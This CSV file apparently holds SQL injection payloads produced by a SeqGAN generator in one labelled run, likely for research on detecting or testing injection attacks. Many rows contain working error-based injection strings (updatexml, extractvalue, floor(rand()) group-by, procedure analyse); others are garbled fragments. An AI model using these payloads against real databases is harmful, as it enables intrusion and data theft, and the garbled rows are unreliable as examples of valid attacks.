label,payload,family,payload_type,method,run_id,sample_index
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""jyzn122",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,16
attack,"11""O",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,17
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'b6270Toebjd3775' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,18
attack,"1""  =  ""' like 'd_U""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""jN""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""Ibb73190x717a767a71,floor  =  a,      (  ||chdp.d.ounadr  ,  ||c  )  thenrxadr.g_floor.eeuunasxyz",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,19
attack,"1%-T  = 4510  =  i  ,)1select by group group xu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,20
attack,"GD""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""58400x7171706a71,2_ddblau'  =  'yb'  =  'awb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,21
attack,"-'||  (  select 'o  91736270,floor  (  (     )  )    )  113  )   from hr  t  6825  4232    )    )     )  (    ,floor  (  ANDfbv ' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,22
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""'alln",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,23
attack,1'||  (  select 'ul,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,24
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""g__rwbul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,25
attack,1fo,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,26
attack,"1' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,27
attack,"11""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""_yyb_ds",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,28
attack,"1blb"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,29
attack,1a3074atelllf5Bn  (  randhgcuwjEqr.ifroms,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,30
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ''  =  'l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,31
attack,1%extractvalue  =llt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,32
attack,1u'  =  'bawwlhavingb0x5czxp,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,33
attack,1bw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,34
attack,1'||  (  select 'w,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,35
attack,"1%}AND  group and   chr  ((  112  )  )    )    )    ),,concat    (  113  selectxxpcetountd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,36
attack,17864(benchmark  113  (  (  =al6825,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,37
attack,"1tauIselect4232""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,38
attack,13326yvbyw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,39
attack,10x78    )    )    6825 Sbyxo    7881i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,40
attack,"1l"" like ""bXeerlych.hrhruacou_lzusw0x78o_  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,41
attack,1 gwhr   select        ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,42
attack,1%b,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,43
attack,"by' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'U'yfw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,44
attack,-%}   (  (0x717a767a71(  uadroy  =xhr  (  =  (  ||chrabdbthyu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,45
attack,1'  )t,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,46
attack,1hett,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,47
attack,1'||  (  select 'Sieln6055T  ifloorua,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,48
attack,1ys    s_pu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,49
attack,-5wtj--wtz'  =  'lbtowubj5856,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,50
attack,"1%\' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'=;_i.0x5cr  )    )    )    thenchddoud",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,51
attack,1'ta    ywb,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,52
attack,)  9627c  )  )  (  )  )     (  *v(,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,53
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,54
attack,"1u"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""evb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,55
attack,"1tealn'  =  '_y.  >  (  0x7171706a71(  ,concathr  4386  (  106  ,concat  hr  (  =  =  )    ,floor  0x7171706a71)    ,  ,=lmgroup    )       )    u#2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,56
attack,1%%59176||selkbt.T  )  (  xn,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,57
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""lww7562zy""  =  ""  (  =obtnm",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,58
attack,-5122,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,59
attack,1%8844WHEREI8877N'  =  '0e_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,60
attack,"1'||  (  select '"" like ""uwT union 0x717a767a71havingstladolybf",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,61
attack,"1%%""  =  ""Tjhr  (  ||chrhr  (  113  (  select FROMooun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,62
attack,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,63
attack,1'||  (  select 'ui,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,64
attack,1lzj4822t'+  (  select 'u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,65
attack,1'||  (  select '(l',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,66
attack,1ub'  =  'w,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,67
attack,1' 3051ml_nbevv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,68
attack,"13785w' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'e'  =  '_4838",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,69
attack,"1"" like ""<0x4b774c75w%b122bM5856ze",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,70
attack,"1-s7wbO5996'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'c'  =  'n",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,71
attack,"c  ||chr  (  (  (  113  , union*  122    ,)  ||rhr  (  4232  6055,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,72
attack,-'||  (  select 'ksEocynw  randls,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,73
attack,-Srpoel'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,74
attack,"1"" like ""IE8382w'  =  'b when    selecttw  *)        (  ,concat  =),  )    )    2   havingRCu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,75
attack,"'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'wbhavingzwthen_nss' like '_f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,76
attack,"1'  =  'e'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,77
attack,1'||  (  select 'selectfbvnesatyw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,78
attack,"1o""  =  ""X",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,79
attack,1hrjeellnalwylbl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,80
attack,1  ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,81
attack,1,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,82
attack,-0x717a767a713775u5996Cnax,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,83
attack,"1%' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'j_l' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '1045allu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,84
attack,1'||  (  select 'y,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,85
attack,-].eecufx,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,86
attack,"1SNDf='   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'b9627",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,87
attack,1h1',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,88
attack,"1t_tl"" like ""'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,89
attack,"1v.' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'0.euaLb'  =  'n",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,90
attack,"1 +hr  (  112  )    )      end6055chta' like 'uaew""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,91
attack,"14232""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,92
attack,"1%_106z  ,thenx fromuat xuvd'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,93
attack,"1' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'wluw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,94
attack,15000000l_aly,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,95
attack,-7562,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,96
attack,"1j'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'keuvs' like ''  =  'lbu' like 'w",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,97
attack,1hltybtuk_lu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,98
attack,"1ONMC'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'vextractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,99
attack,'  select groupchchr  (  (  casem222aunwau,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,100
attack,1%'  =  's'  =  'yf,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,101
attack,elsecunnal,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,102
attack,"1""n",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,103
attack,1'||  (  select 'bisbl,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,104
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   """",0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,105
attack,1'a,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,106
attack,1 ' like 'by   0eln,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,107
attack,17562eunu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,108
attack,"'||  (  select '""(  =)122hzl'  =  'xzu9325tizyhwwlkINchr  =  ||c  casel  =ul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,109
attack,"1'||  (  select 'oqlwbk. Rchdr  )  )    )  0     (  rand  ,concatconcat  select    0uax end     )    )         )  ,from0x7171706a71)WHERE union groupSSTIEeesu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,110
attack,1'   )    (  *2i,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,111
attack,"1%' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ' where else chchhchhohr  select   aau--",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,112
attack,-5840,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,113
attack,1%yv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,114
attack,"1a""ldflooreayawlbnw0x7171706a71
",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,115
attack,"1u  (  (  )    )   anda union1   )    )    )2zzywub""  =  ""1222",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,116
attack,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'f    casecase5483at",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,117
attack,1.  (  =  --eluyxln,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V2__sql_aware__len160__gpre60__reward_off__seed88,118
